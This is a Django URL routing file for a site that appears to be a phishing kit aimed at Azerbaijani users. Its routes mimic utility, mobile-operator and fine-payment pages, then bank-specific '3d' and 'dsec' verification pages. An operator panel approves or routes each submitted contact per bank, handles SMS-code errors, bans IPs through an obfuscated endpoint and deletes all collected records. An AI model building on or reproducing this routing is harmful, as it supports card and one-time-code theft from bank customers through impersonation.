from django.urls import path
from django.urls import re_path

from . import views
from django.urls import path
from . import views
from .views import BannedIPListCreateAPIView
urlpatterns = [
    path("", views.index, name="index"),
    path("azerisiq", views.azerisiq, name="azerisiq"),
    path("azersu", views.azersu, name="azersu"),
    path("azeriqaz", views.azeriqaz, name="azeriqaz"),
    path('azercell', views.azercell, name="azercell"),
    path('nar', views.nar, name="nar"),
    path('bakcell', views.bakcell, name="bakcell"),
    path('naxtel', views.naxtel, name="naxtel"),
    path('info', views.info, name="info"),
    path('loading', views.loading, name="loading"),
    path('cerime', views.cerime, name="cerime"),
    path('crud/create/', views.contact_create, name='contact_create'),
    path('crud/update/<int:pk>/', views.contact_update, name='contact_update'),
    path('crud/delete/<int:pk>/', views.contact_delete, name='contact_delete'),
    path('crud/', views.crud, name='crud'),
    path('crud/api/list/', views.contact_list_api, name='contact_list'),
    path('approve-action/', views.approve_action, name='approve_action'),
    path('approval_page/<int:pk>/', views.approval_page, name='approval_page'),
    path('crud/approve/<int:pk>/', views.contact_approve, name='contact_approve'),
    path('crud/kapital/<int:pk>/', views.contact_approve, name='contact_approve'),
    path('crud/abb/<int:pk>/', views.contact_approve_abb, name='contact_approve'),
    path('crud/unibank/<int:pk>/', views.contact_approve_unibank, name='contact_approve'),

    path('phone_only_count_api/', views.phone_only_count_api, name='phone_only_count_api'),


    path('crud/smserror/<int:pk>/', views.smserror, name='smserror'),
    path('crud/smsfix/<int:pk>/', views.smserrorfix, name='smserrorfix'),
    
    
    path('crud/pashabank/<int:pk>/', views.contact_approve_pashabank, name='contact_approve'),
    path('crud/error/<int:pk>/', views.contact_approve_error, name='contact_approve'),
    path('crud/api/approve/<int:pk>/', views.approve_contact_api, name='approve_contact_api'),
    path('check_approval_status/<int:contact_id>/', views.check_approval_status, name='check_approval_status'),
    path('kapital/', views.kapital, name='kapital'),
    path('kapital/dseckapital', views.dseckapital, name='dseckapital'),
    path('abb/', views.abb, name='abb'),
    path('abb/dsecazericard', views.dsecazericard, name='dsecazericard'),
    path('rabite', views.rabite, name='rabite'),
    path('crud/leobank/<int:pk>/', views.leobank, name='leobank'),
    path('leobank3d', views.leobank3d, name='leobank3d'),
    path('unibank', views.unibank, name='unibank'),
    path('unibank3d', views.unibank3d, name='unibank3d'),
    path('pashabank', views.pashabank, name='pashabank'),
    path('pashabank3d', views.pashabank3d, name='pashabank3d'),
    path('error', views.error, name='error'),
    path('api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/', BannedIPListCreateAPIView.as_view(), name='banned_ips'),
    path('unique_ip_count/', views.unique_ip_count, name='unique_ip_count'),
    path('active_users_count/<str:page_name>/', views.active_users_count, name='active_users_count'),
    
    
    path('delete_all/', views.delete_all_contacts, name='delete_all_contacts'),

]

